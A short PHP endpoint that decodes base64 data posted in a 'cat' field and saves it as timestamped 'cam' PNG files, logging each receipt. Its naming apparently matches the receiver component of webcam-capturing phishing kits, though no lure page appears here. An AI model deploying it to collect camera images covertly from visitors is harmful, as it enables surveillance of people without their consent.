<?php
// Suppress error display to prevent server path disclosure
ini_set('display_errors', '0');
error_reporting(0);

header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');

$date = date('dMYHis');

if (isset($_POST['cat']) && !empty($_POST['cat'])) {
    $imageData = (string)$_POST['cat'];

    // Append to Log.log
    @file_put_contents("Log.log", "Received\r\n", FILE_APPEND);

    // Filter base64 header if present (e.g. data:image/png;base64,...)
    $commaPos = strpos($imageData, ",");
    $filteredData = ($commaPos !== false) ? substr($imageData, $commaPos + 1) : $imageData;
    $unencodedData = base64_decode($filteredData, true);

    if ($unencodedData !== false && strlen($unencodedData) > 0) {
        $filename = 'cam' . $date . '.png';
        $fp = @fopen($filename, 'wb');
        if ($fp) {
            fwrite($fp, $unencodedData);
            fclose($fp);
            http_response_code(200);
            echo json_encode(['status' => 'success', 'message' => 'Image saved']);
            exit();
        }
    }
}

http_response_code(400);
echo json_encode(['status' => 'error', 'message' => 'No valid image data provided']);
exit();
